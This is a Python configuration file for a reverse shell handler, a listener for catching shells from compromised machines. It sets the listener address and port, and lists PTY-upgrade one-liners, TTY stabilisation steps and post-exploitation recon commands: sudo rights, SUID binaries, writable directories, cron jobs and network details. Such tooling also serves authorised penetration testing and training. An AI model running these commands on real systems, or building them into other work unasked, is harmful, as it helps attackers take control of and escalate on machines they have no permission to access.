"""Configuration and constants for reverse shell handler"""

from datetime import datetime

# Network Configuration
DEFAULT_LHOST = '0.0.0.0'
DEFAULT_LPORT = 4444
SOCKET_TIMEOUT = 2
RECV_BUFFER_SIZE = 4096

# Shell Upgrade Methods
PTY_UPGRADE_METHODS = [
    "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "/usr/bin/script -qc /bin/bash /dev/null"
]

# TTY Stabilization Steps
TTY_STABILIZATION_STEPS = [
    "1. Press Ctrl+Z to background the shell",
    "2. Run: stty raw -echo; fg",
    "3. Press Enter twice",
    "4. Run: export TERM=xterm",
    "5. Run: stty rows 38 columns 116 (adjust to your terminal size)"
]

# Situational Awareness Commands
RECON_COMMANDS = {
    'Hostname': 'hostname',
    'Current User': 'whoami',
    'User ID': 'id',
    'OS Version': 'cat /etc/os-release 2>/dev/null || cat /etc/issue',
    'Kernel': 'uname -r',
    'Architecture': 'uname -m',
    'Network Config': 'ip a 2>/dev/null || ifconfig',
    'Routing Table': 'ip route 2>/dev/null || route -n',
    'DNS Config': 'cat /etc/resolv.conf',
    'Active Connections': 'netstat -tunap 2>/dev/null || ss -tunap',
    'Running Processes': 'ps aux',
    'Sudo Rights': 'sudo -l 2>/dev/null',
    'SUID Binaries': 'find / -perm -4000 -type f 2>/dev/null',
    'Writeable Directories': 'find / -writable -type d 2>/dev/null | grep -v proc',
    'Home Directories': 'ls -la /home/',
    'Cron Jobs': 'cat /etc/crontab; ls -la /etc/cron.*',
}

# Shell Identification Commands
SHELL_ID_COMMANDS = {
    'os': 'uname -a',
    'user': 'whoami',
    'id': 'id',
    'sudo': 'sudo -l',
    'shell': 'echo $SHELL'
}

# Output truncation settings
MAX_OUTPUT_LINES = 20